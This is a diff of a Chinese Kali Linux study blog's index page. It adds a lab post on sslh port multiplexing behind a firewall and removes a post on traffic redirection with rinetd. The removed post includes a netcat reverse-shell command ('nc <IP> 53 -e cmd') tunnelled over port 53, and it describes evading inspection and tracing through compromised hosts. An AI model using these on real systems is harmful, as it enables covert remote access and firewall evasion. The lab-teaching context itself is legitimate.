@@ -240,6 +240,276 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%BA%94)%EF%BC%9A%E4%B8%80%E7%AB%AF%E5%8F%A3%E5%A4%9A%E6%9C%8D%E5%8A%A1%E9%9A%A7%E9%81%93--sslh/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%BA%94)%EF%BC%9A%E4%B8%80%E7%AB%AF%E5%8F%A3%E5%A4%9A%E6%9C%8D%E5%8A%A1%E9%9A%A7%E9%81%93--sslh/" itemprop="url">Kali Linux笔记(七十五)：一端口多服务隧道--sslh</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-03T20:02:26+08:00">
+                2020-02-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  906 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  3 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-sslh（ssl-ssh）"><a href="#1-sslh（ssl-ssh）" class="headerlink" title="1. sslh（ssl+ssh）"></a>1. sslh（ssl+ssh）</h4><ul>
+<li>端口分配器<ul>
+<li>根据客户端第一个包检测协议类型</li>
+<li>根据协议检测结果将流量转发给不同目标</li>
+<li>支持HTTP、HTTPS、SSH、OpenVPN、tinc、XMAPP和可基于正则表达式判断的人和协议类型</li>
+<li>适用于防火墙允许443端口入站访问流量的环境</li>
+</ul>
+</li>
+</ul>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=ed38YCIqLNmxjaaXrpNE_zl1ng5nkA0-PloYS83SCnUR6MG5eHTGwKuXdph1vuKkMB_a1IY9gq6g2erwSKlO-Ip9TsvIxfJmlbqacE4CZEbEULLv-w&file_name=/sslh.PNG" alt="sslh"></p>
+<h4 id="2-实验"><a href="#2-实验" class="headerlink" title="2. 实验"></a>2. 实验</h4><ul>
+<li>Mono防火墙<ul>
+<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
+</ul>
+</li>
+<li>Kali（SSLH）<ul>
+<li>网卡方式为Host-only方式，检查网络</li>
+</ul>
+</li>
+<li>Window Server 2003（内网的CA服务器）<ul>
+<li>网卡方式为Host-only方式，检查网络</li>
+<li>安装web server<ul>
+<li>Win+R → appwiz.cpl → 更改或添加程序 → 应用程序服务器 → IIS → 万维网服务/Active Server Pages，可能需要光盘）</li>
+</ul>
+</li>
+<li>安装CA服务器<ul>
+<li>Win+R → appwiz.cpl → 更改或添加程序 → 证书服务 </li>
+<li>独立根CA类型、证书名称：LAB CA、有效期限</li>
+</ul>
+</li>
+<li>开始 → Internet信息服务（IIS）管理器<ul>
+<li>w2k3（本地计算机）→ 网站 → 默认网站 → 右键 → 属性</li>
+<li>目录安全性 → 服务器证书 → 名称：<a href="http://www.lab.com、2048位长、单位：IT、部门：IT、公用名称：www.lab.com、国家/省市" target="_blank" rel="noopener">www.lab.com、2048位长、单位：IT、部门：IT、公用名称：www.lab.com、国家/省市</a> → 修改申请文件放置位置</li>
+<li>浏览器范围访问<a href="http://127.0.0.1/certsrv/" target="_blank" rel="noopener">http://127.0.0.1/certsrv/</a> → 申请证书 → 高级证书 → BASE64编码 → 粘贴证书服务器代码 → 提交</li>
+</ul>
+</li>
+<li>开始 → 证书服务器管理<ul>
+<li>LAB CA → 挂起的申请 → 选中申请的证书右键 → 所有任务 → 颁发</li>
+<li>证书可以在颁发的证书中查看详细信息</li>
+</ul>
+</li>
+<li>浏览器范围访问<a href="http://127.0.0.1/certsrv/" target="_blank" rel="noopener">http://127.0.0.1/certsrv/</a> → 查看挂起的证书申请状态 → 下载证书 → 保存在桌面 </li>
+<li>开始 → Internet信息服务（IIS）管理器<ul>
+<li>w2k3（本地计算机）→ 网站 → 默认网站 → 右键 → 属性</li>
+<li>目录安全性 → 服务器证书 → 处理挂起的请求并安装证书 </li>
+<li>w2k3（本地计算机）→ 网站 → 默认网站 → 右键 → 属性</li>
+<li>目录安全性 → 查看证书</li>
+<li>w2k3（本地计算机）→ 网站 → 默认网站 → 右键 → 属性</li>
+<li>目录安全性 → 编辑 → 要求安全通道（SSL）</li>
+<li>停止网站 → 重新启动</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Kali（SSLH）<ul>
+<li>浏览器访问<a href="https://Window" target="_blank" rel="noopener">https://Window</a> Server 2003的IP，看是否能通过SSL通道进行通信</li>
+<li>配置文件：<strong><code>🔺命令：vi /etc/default/sslh</code></strong><ul>
+<li>RUN=yes</li>
+<li>DAEMON=/usr/sbin/sslh</li>
+<li>DAEMON_OPTS=”–user sslh –listen 本机的IP:443 –ssh 127.0.0.1:22 –http 127.0.0.1:80  –ssl Window Server 2003的IP:443 –pidfile /var/run/sslh/sslh.pid”</li>
+</ul>
+</li>
+<li>启动apache服务，修改侦听端口<strong><code>🔺命令：vi /etc/apache2/ports.conf</code></strong> → 127.0.0.1:80，重启apache服务，<strong><code>🔺命令：netstat -pantu</code></strong>查看是否更改</li>
+<li>开启SSH服务（修改SSH配置文件）</li>
+</ul>
+</li>
+<li>Mono防火墙<ul>
+<li>浏览器访问mono防火墙</li>
+<li>新建NAT规则<ul>
+<li>Interface → WAN</li>
+<li>External address → Interface address（若为网段其他的IP映射，需设置为WAN address → Server NAT → 加入整个网段）</li>
+<li>Protocol → TCP</li>
+<li>External port range → HTTPS/HTTPS</li>
+<li>NAT IP → KALI的IP</li>
+<li>Auto-add a firewall rule to permit traffic through this NAT rule</li>
+</ul>
+</li>
+<li>保存应用，Rules的WAN口多出一条rule</li>
+</ul>
+</li>
+<li>Kali（SSLH）<ul>
+<li><strong><code>🔺命令：service sslh start</code></strong>（netstat -pantu进行查看）</li>
+<li>浏览器验证本机http是否正常进行</li>
+</ul>
+</li>
+<li>物理机<ul>
+<li>浏览器访问http://防火墙WAN的IP:443 → Kali的Web资源</li>
+<li>浏览器访问https://防火墙WAN的IP → Window Server 2003的Web资源</li>
+<li>ssh尝试登陆防火墙WAN的IP:443进行登陆</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：namp -p443 -sV -A 防火墙WAN的IP</code></strong><ul>
+<li>基本可以扫描出所有的服务</li>
+</ul>
+</li>
+<li>▲ 2020.2.3内网sslh代理正常，原因在于访问Kali IP三种方式都能代理，但外网WAN访问防火墙WAN的IP，无法进行访问，进行ping防火墙WAN的IP也无法成功，猜测与防火墙规则有关</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E5%9B%9B)%EF%BC%9AHTTP(S)%E9%9A%A7%E9%81%93--proxytunnel/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2967,336 +3237,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/31/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%BA%94)%EF%BC%9A%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E3%80%81%E9%87%8D%E5%AE%9A%E5%90%91/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/31/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%BA%94)%EF%BC%9A%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E3%80%81%E9%87%8D%E5%AE%9A%E5%90%91/" itemprop="url">Kali Linux笔记(六十五)：流量操控、重定向</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-31T20:47:32+08:00">
-                2020-01-31
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  1.1k 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  4 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-流量操控技术"><a href="#1-流量操控技术" class="headerlink" title="1. 流量操控技术"></a>1. 流量操控技术</h4><ul>
-<li>Traffic manipulation technique </li>
-<li>渗透测试中经常遇到访问受限的网络环境<ul>
-<li>防火墙/交换机，端口映射相比于主机直接外网访问更安全</li>
-<li>DNS，TCP/UDP的53端口，基本不过滤</li>
-<li>SSH，22端口，基本不过滤</li>
-<li>通过与家里的电脑进行连接，达到可以访问其他网络资源的结果</li>
-</ul>
-</li>
-<li>使用隐蔽的手段逃避安全检查措施和朔源追踪<ul>
-<li>使明文传输的内容变成加密的内容，躲避安全检查</li>
-<li>跳转攻击源头难以追踪，使用肉鸡进行攻击</li>
-</ul>
-</li>
-<li>证明看似严格的访问控制仍然存在弱点</li>
-<li>在非受信任的网络中实现安全的数据传输<ul>
-<li>难以规避非受信任网络的中间人攻击（arp地址欺骗）</li>
-<li>通过与信任的节点进行连接，加密数据，达到数据转发传输的结果</li>
-</ul>
-</li>
-<li>部分概念的实现过程略有烧脑</li>
-</ul>
-<h4 id="2-流量操控技术"><a href="#2-流量操控技术" class="headerlink" title="2. 流量操控技术"></a>2. 流量操控技术</h4><ul>
-<li>重定向（Redirection）<ul>
-<li>IP、Port</li>
-<li>不进行加密处理，只是作为中间转发</li>
-</ul>
-</li>
-<li>隧道（Tunneling）<ul>
-<li>在不受信任的网络环境中实现安全的通信（两个节点之间的加密流量传输）</li>
-<li>通常使用多种加密技术建立通信隧道</li>
-<li>点到点（IP2IP）、端到端（Port2Port）<ul>
-<li>点到点的安全只有在隧道之间，内网的传输是明文</li>
-<li>端到端是两个进程之间的加密，基本不存在中间人攻击</li>
-</ul>
-</li>
-<li>VPN<ul>
-<li>pptp（不太安全技术，客户端到目标网络，▲过程有几个明文传输）</li>
-<li>l2tp（二层VPN技术，客户端到目标网络）</li>
-<li>IPSec（安全性首选，站点到站点）</li>
-<li>SSL vpn（端到端的VPN，客户端使用连接服务器）</li>
-<li>SSH</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>封装（encapsulation）<ul>
-<li>通常结合在隧道中使用，使用一种协议封装一种协议（RPC o http、VoIP）</li>
-<li>使用网关设备实现不同类型网络的互联互通</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-重定向"><a href="#3-重定向" class="headerlink" title="3. 重定向"></a>3. 重定向</h4><ul>
-<li>Rinetd<ul>
-<li>安装：<strong><code>🔺命令：apt-get install rinetd</code></strong></li>
-<li>配置：/etc/rinetd.conf（bindaddress bindport connectaddress connectport）</li>
-<li>运行：<strong><code>🔺命令：rinetd</code></strong></li>
-</ul>
-</li>
-<li>应用场景<ul>
-<li>重定向web流量，突破上网限制</li>
-<li>远程桌面重定向</li>
-<li>Nc重定向获得Shell</li>
-<li>不兼容FTP等二次连接的协议</li>
-</ul>
-</li>
-</ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=6f718p4gikJ1DMU67m0OI1iMS0EMZMo-Ixr2O-oucAPsPTtvy7ZMXP01Ua3P2CAwfD0wwWfeQknbUKQiMq5D5HbYY_RDRPo1R1Mx6R2ysnNVOOxXyk-QVjiL&file_name=/%E9%87%8D%E5%AE%9A%E5%90%91.PNG" alt="重定向"></p>
-<h4 id="4-80端口Web服务访问"><a href="#4-80端口Web服务访问" class="headerlink" title="4. 80端口Web服务访问"></a>4. 80端口Web服务访问</h4><ul>
-<li>安装monowall防火墙<ul>
-<li>需要两块网卡，第一块网卡为连接内网的Host-Only网卡，第二块为连接外网的桥接网卡</li>
-<li>安装光盘放进去ISO文件</li>
-<li>选择7，Install on Hard Drive，安装在硬盘上</li>
-<li>输入设备ad0</li>
-<li>重启并拔出ISO光盘</li>
-</ul>
-</li>
-<li>monowall防火墙配置<ul>
-<li>硬盘启动</li>
-<li>选择1，指定网卡接口，不需要vlan</li>
-<li>输入LAN局域网接口em0，输入WAN广域网接口em1，无需其他的端口设置</li>
-<li>重启设备</li>
-</ul>
-</li>
-<li>monowall再配置<ul>
-<li>硬盘启动</li>
-<li>选择2，指定局域网IP地址，子网掩码（bit数），DHCP服务</li>
-<li>选择3，重置webGUI界面，重置为mono</li>
-<li>选择5，重启mono</li>
-</ul>
-</li>
-<li>开启一台win xp sp3电脑<ul>
-<li>选择Host-only网络</li>
-<li>ifconfig/进行ping通信、上网尝试</li>
-</ul>
-</li>
-<li>进入monowall防火墙管理界面<ul>
-<li>Rules，初始规则为LAN → Any</li>
-<li>删除默认规则，进行外网访问尝试</li>
-<li>新建一条规则，Action → Pass，Protocol → TCP/UDP，Destination port range → DNS</li>
-<li>Apply进行应用</li>
-</ul>
-</li>
-<li>Kali网络设置为桥接<ul>
-<li>需要访问墙外流量</li>
-<li><strong><code>🔺命令：apt-get install rinetd</code></strong></li>
-<li><strong><code>🔺命令：vi /etc/rinetd.conf</code></strong>（指向的配置）<ul>
-<li>bindaddress（本机侦听IP）</li>
-<li>bindport（本机侦听端口）</li>
-<li>connectaddress（连接IP）</li>
-<li>connectport（侦听的端口）</li>
-</ul>
-</li>
-<li>rinetd</li>
-</ul>
-</li>
-<li>Window Server 2003网络设置为桥接<ul>
-<li>开启远程桌面，cmd修改管理员密码（net user administrator *）</li>
-<li>安装web server（Win+R → appwiz.cpl → 更改或添加程序 → 应用程序服务器 → IIS，可能需要光盘）</li>
-<li>修改Web的首页面（C:\Inetpub\wwwroot\iisstart.html）</li>
-<li>访问127.0.0.1进行尝试</li>
-</ul>
-</li>
-<li>Win xp访问Kali主机IP的53端口</li>
-</ul>
-<h4 id="5-3389端口远程桌面访问"><a href="#5-3389端口远程桌面访问" class="headerlink" title="5. 3389端口远程桌面访问"></a>5. 3389端口远程桌面访问</h4><ul>
-<li>Kali设置<ul>
-<li><strong><code>🔺命令：vi /etc/rinetd.conf</code></strong>（指向的配置），修改connectport为3389端口</li>
-<li><strong><code>🔺命令：pkill rinetd</code></strong></li>
-<li><strong><code>🔺命令：rinetd</code></strong></li>
-</ul>
-</li>
-<li>Win xp访问远程桌面<ul>
-<li>Win+R → mstsc → Kali主机IP的53端口</li>
-<li>尝试登陆，ifconfig</li>
-</ul>
-</li>
-</ul>
-<h4 id="6-NC获取shell"><a href="#6-NC获取shell" class="headerlink" title="6. NC获取shell"></a>6. NC获取shell</h4><ul>
-<li>思想：XP执行NC把自己的Shell发给Kali的53端口，转发给Window Server 2003，在Window Server 2003用nc来接受Shell</li>
-<li><strong><code>🔺命令：cp /usr/share/windows-binaries/nc.exe /root/Desktop</code></strong>（拷贝到XP和2003的机子上）</li>
-<li>Window Server 2003<ul>
-<li><strong><code>🔺命令：cmd → nc -nvlp 3333</code></strong></li>
-</ul>
-</li>
-<li>Kali设置<ul>
-<li><strong><code>🔺命令：vi /etc/rinetd.conf</code></strong>（指向的配置），修改connectport为3333端口</li>
-<li><strong><code>🔺命令：pkill rinetd</code></strong></li>
-<li><strong><code>🔺命令：rinetd</code></strong></li>
-</ul>
-</li>
-<li>Window XP<ul>
-<li><strong><code>🔺命令：nc Kali的IP地址 53 -e cmd</code></strong></li>
-</ul>
-</li>
-<li>Window Server 2003进行ipconfig</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3351,7 +3291,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">101</span>
+                  <span class="site-state-item-count">102</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3458,7 +3398,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">98.3k</span>
+    <span title="Site words total count">98.6k</span>
   
 </div>
 
